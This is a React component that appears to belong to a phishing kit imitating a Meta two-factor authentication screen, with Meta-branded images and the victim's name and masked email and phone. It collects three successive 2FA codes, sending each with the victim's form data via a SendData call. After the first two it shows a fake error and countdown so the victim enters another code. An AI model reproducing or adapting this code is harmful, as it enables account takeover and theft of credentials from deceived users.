import React from 'react'
import Modal from './Modal'
import { SITE_MAIN_MESSAGE } from '#data/site-message'
import { maskEmail, maskPhoneNumber } from '@/utils/mask';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email } = formDataState as FormData || {};

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email);

    let [countdown, setCountdown] = React.useState<number>((process.env.NEXT_PUBLIC_SETTING_TIME) ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setTwoFa(value);
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change

        if (click === 0) {
            dispatch(updateForm({ twoFa: value }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: value }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: value }));
        }
    };

    const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);

            if (!isTwoFaValid) {
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setErrors({
                            twoFa: SITE_MAIN_MESSAGE,
                        });

                        setLoading(false);
                        setTwoFa('');

                        const countdownInterval = setInterval(() => {
                            setDisable(true);
                            countdown -= 1;
                            setCountdown(countdown);

                            setErrors({
                                twoFa: SITE_MAIN_MESSAGE,
                            });

                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                setClick(1);
                                setErrors({});
                                setDisable(false)
                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                            }
                        }, 1000);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setErrors({
                            twoFa: SITE_MAIN_MESSAGE,
                        });
                        setLoading(false);
                        setTwoFa('');

                        const countdownInterval = setInterval(() => {
                            setDisable(true);
                            countdown -= 1;
                            setCountdown(countdown);

                            setErrors({
                                twoFa: SITE_MAIN_MESSAGE,
                            });

                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                setClick(2);
                                setErrors({});
                                setDisable(false)
                                setCountdown(process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30);
                            }
                        }, 1000);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        isOpendFinish(true);
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors(newErrors);
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <div className='w-full'>
                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                        <span>{fullName}</span>
                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                        <span>{SITE_MAIN_MESSAGE}</span>
                    </div>
                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>{SITE_MAIN_MESSAGE}</h2>
                    <p className='text-[#9a979e] text-[14px]'>{SITE_MAIN_MESSAGE} {emailDisplay} {phoneDisplay}</p>
                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                    </div>
                    <div className='w-full'>
                        <form onSubmit={handSubmit}>
                            <div className={`${inputClass('twoFa')}`} >
                                <input
                                    type="number"
                                    id="twoFa"
                                    placeholder={SITE_MAIN_MESSAGE}
                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    disabled={disabled}
                                />
                            </div>
                            {errorText('twoFa')}

                            <div className='w-full mt-[20px]'>
                                <button
                                    className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                    disabled={disabled || !isTwoFaValid}
                                >
                                    {loading && (
                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                        </div>
                                    )}
                                    {loading ? '' : SITE_MAIN_MESSAGE}
                                </button>
                            </div>

                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
                                <span>{SITE_MAIN_MESSAGE}</span>
                            </div>
                        </form>
                    </div>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto pt-8'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;